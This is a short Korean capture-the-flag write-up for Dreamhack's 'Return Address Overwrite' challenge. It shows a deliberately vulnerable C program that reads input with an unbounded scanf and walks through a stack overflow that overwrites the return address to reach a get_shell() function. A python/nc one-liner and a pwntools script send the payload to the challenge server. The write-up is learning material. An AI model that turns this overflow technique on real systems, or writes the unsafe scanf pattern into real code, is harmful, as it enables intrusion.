## 📍Return Address Overwrite

```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

#### 풀이
`main` 함수가 반환될 때 돌아갈 반환 주소에 `get_shell()` 함수의 주소를 넣어야 한다.
`scanf()` 함수의 버퍼 시작 주소를 알아내고, 리턴 주소인 `rbp+0x8`까지의 거리를 알아낸다.
버퍼 시작 주소부터 리턴 주소까지 더미 데이터로 채운다.
더미 데이터 이후에는 `get_shell()` 함수의 시작 주소를 넣는다.


`rao` 바이너리를 gdb로 분석:
![](Attachments/3DBFE693-B01D-495B-8CCA-1428D4460714.png)

`scanf()` 함수의 버퍼 시작 주소 = `rbp-0x30`

![](Attachments/0F7D3B72-B913-4AB6-A0BD-BA48609C5D6C.png)

`get_shell()` 함수의 시작 주소: `0x4006aa`

```
$ (python -c "print 'A'*0x30 + 'B'*0x8 + '\xaa\x06\x40\x00\x00\x00\x00\x00')" | nc host3.dreamhack.games 22743
```

위처럼 파이썬 인터프리터로 전달하지 말고 pwntools를 이용해보자! 😠

```python
from pwn import *

p = remote('host3.dreamhack.games', 22743)
payload = b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00'

p.sendline(payload)

p.interactive()
```

![](Attachments/B5182A5A-5D23-4958-81C1-1B7FF2686AE5.png)

🚩